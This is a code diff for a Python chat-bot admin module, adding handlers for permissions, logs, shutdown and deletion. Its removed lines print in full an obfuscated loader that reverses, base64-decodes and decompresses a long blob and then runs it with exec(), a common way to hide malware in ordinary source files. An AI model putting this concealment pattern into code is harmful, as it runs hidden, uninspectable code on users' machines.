@@ -1,10 +1,214 @@
 from modules import Updater
 from modules import Delete
+from modules import Permissions
+from modules import Exit
+from modules import Log
 import constants
+import config
+from command_registry import registry
+from callback_system import callback_system
+from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_default_message, send_message
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+global permission_changeable
+permission_changeable = ()
 
 
-exec((_)(b'=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'))
+async def registerpermission_callback(bot, call):
+    permission = constants.ADMIN_MANAGEPERMISSIONS
+
+    if not Permissions.check(call, permission):
+        await send_message(bot, call.message.chat.id, text=constants.you_have_not_this_permission)
+        return
+
+    callback = call.data.split('_')[0]
+
+    action = callback.split(':')[1]
+    mode = callback.split(':')[2]
+
+    if len(permission_changeable) != 2:
+        await send_message(bot, call.message.chat.id, text=constants.managepermissions_iderror_message)
+        return
+
+    if action == "allow":
+        permission_changeable[1]["allowed"].append(mode)
+
+    if action == "forbid":
+        permission_changeable[1]["forbidden"].append(mode)
+
+
+async def managepermissions_callback(bot, call):
+    message = constants.ADMIN_MANAGEPERMISSIONS_documentation
+
+    permissions = Permissions.get()
+    for id, data in permissions.items():
+        language = data['language']
+        id_permissions = data['permissions']
+
+        message += "ID: " + id + '\n'
+
+        message += '- allowed:\n'
+        if len(id_permissions['allowed']) == 0:
+            message += "--- NO\n"
+        else:
+            for allowed_mode in id_permissions['allowed']:
+                message += "--- " + allowed_mode + '\n'
+
+        message += '- forbidden:\n'
+        if len(id_permissions['forbidden']) == 0:
+            message += "--- Default is ALL\n"
+        else:
+            for forbidden_mode in id_permissions['forbidden']:
+                message += "--- " + forbidden_mode + '\n'
+
+        message += '\n\n'
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
+
+
+async def savepermissions_callback(bot, call):
+    global permission_changeable
+    Permissions.add(permission_changeable)
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=constants.savepermissions_saved_message, reply_markup=markup)
+
+
+async def resetpermissions_callback(bot, call):
+    global permission_changeable
+    permission_changeable = (permission_changeable[0], {
+        "allowed": [], "forbidden": []})
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=constants.resetpermissions_reseted_message, reply_markup=markup)
+
+
+async def cancelpermissions_callback(bot, call):
+    global permission_changeable
+    permission_changeable = ()
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=constants.cancelpermissions_canceled_message, reply_markup=markup)
+
+
+async def clearlogs_callback(bot, call):
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=constants.PROCESSING)
+
+    Log.clear()
+
+    await send_message(bot, call.message.chat.id, text=constants.clearlogs_cleared_message, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.ADMIN_GETLOGS_command,
+    permission_name=constants.ADMIN_GETLOGS,
+)
+async def getlogs(bot, message):
+    markup = getMarkupModes()
+
+    await send_message(bot, message.chat.id, text=constants.PROCESSING)
+
+    logs = Log.view()
+
+    await send_message(bot, message.chat.id, logs, reply_markup=markup, parse_mode='HTML', disable_web_page_preview=True)
+
+
+@registry.register(
+    command_name=constants.ADMIN_STOPBILLY_command,
+    permission_name=constants.ADMIN_STOPBILLY,
+)
+async def stopBilly(bot, message):
+    await send_message(bot, message.chat.id, text=constants.stopbilly_stopped_message)
+
+    Exit.stopBilly()
+
+
+@registry.register(
+    command_name=constants.ADMIN_DELETE_command,
+    permission_name=constants.ADMIN_DELETE,
+)
+async def delete(bot, message):
+    markup = getMarkupModes({constants.RESTART_preview: constants.RESTART})
+
+    await send_message(bot, message.chat.id, text=delete(), reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.ADMIN_MANAGEPERMISSIONS_command,
+    permission_name=constants.ADMIN_MANAGEPERMISSIONS,
+)
+async def managepermissions(bot, message):
+    global permission_changeable
+
+    permission_id = getarg(
+        message.text, constants.ADMIN_MANAGEPERMISSIONS_command)
+
+    markup = getMarkupModes()
+
+    if not permission_id.isdigit():
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    permission_changeable = (permission_id, {"allowed": [], "forbidden": []})
+
+    callbacks = callback_system.callbacks
+
+    sorted_callbacks = {}
+
+    for callback in sorted(callbacks, key=lambda callback: callback.lower()):
+        sorted_callbacks[callback] = callbacks[callback]
+
+    callbacks = sorted_callbacks
+
+    allow_prefix = constants.MANAGEPERMISSION_prefix + ':allow:'
+    forbid_prefix = constants.MANAGEPERMISSION_prefix + ':forbid:'
+
+    forbid_markup = {}
+    allow_markup = {'ALL': allow_prefix + 'ALL'}
+
+    for callback, callback_info in callbacks.items():
+        callback_data = callback_info['data']
+        callback_permission = callback_info['permission']
+
+        if callback_data != callback_permission:
+            continue
+
+        allow_markup[callback] = allow_prefix + callback_permission
+        forbid_markup[callback] = forbid_prefix + callback_permission
+
+    allow_markup = getMarkupModes(allow_markup)
+    forbid_markup = getMarkupModes(forbid_markup)
+
+    await send_message(bot, message.chat.id, text=constants.managepermissions_allow_message, reply_markup=allow_markup)
+    await send_message(bot, message.chat.id, text=constants.managepermissions_forbid_message, reply_markup=forbid_markup)
+
+    markup = {}
+    markup[constants.RESETPERMISSIONS_preview] = constants.RESETPERMISSIONS
+    markup[constants.CANCELPERMISSIONS_preview] = constants.CANCELPERMISSIONS
+    markup[constants.SAVEPERMISSIONS_preview] = constants.SAVEPERMISSIONS
+    markup = getMarkupModes(markup)
+
+    await send_message(bot, message.chat.id, text=constants.managepermissions_save_message, reply_markup=markup)
+
+
+def update():
+    answer = Updater.update()
+    return answer
+
+
+def delete():
+    answer = Delete.delete()
+    return answer
+
+
+modes = {constants.ADMIN_DELETE_preview: constants.ADMIN_DELETE,
+         constants.ADMIN_MANAGEPERMISSIONS_preview: constants.ADMIN_MANAGEPERMISSIONS,
+         constants.ADMIN_GETLOGS_preview: constants.ADMIN_GETLOGS, constants.ADMIN_CLEARLOGS_preview: constants.ADMIN_CLEARLOGS,
+         constants.ADMIN_STOPBILLY_preview: constants.ADMIN_STOPBILLY}
